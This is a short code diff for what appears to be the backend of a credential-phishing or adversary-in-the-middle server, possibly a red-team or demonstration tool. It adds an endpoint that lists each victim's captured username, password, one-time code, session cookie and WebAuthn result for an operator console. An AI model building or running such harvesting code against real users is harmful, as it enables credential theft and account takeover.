@@ -118,6 +118,23 @@ def stolen():
     return {"count": len(STOLEN), "items": STOLEN}
 
 
+@app.get("/api/captures")
+def api_captures():
+    """Full captured data per victim, for the terminal operator console."""
+    out = []
+    for s in _sessions():
+        creds = s.get("creds") or {}
+        out.append({
+            "track": s["track"], "first": s.get("first"),
+            "username": creds.get("username"), "password": creds.get("password"),
+            "otp": (s.get("otp") or {}).get("code"),
+            "cookie": s.get("cookie"),            # {cookie_name, cookie_value, note}
+            "webauthn": s.get("webauthn"),        # {bound_origin, verdict, rp_status}
+            "events": len(s.get("events", [])),
+        })
+    return JSONResponse({"captures": out})
+
+
 @app.get("/api/summary")
 def api_summary():
     """Machine-readable capture summary for the kingnet CLI (mission auto-detection)."""
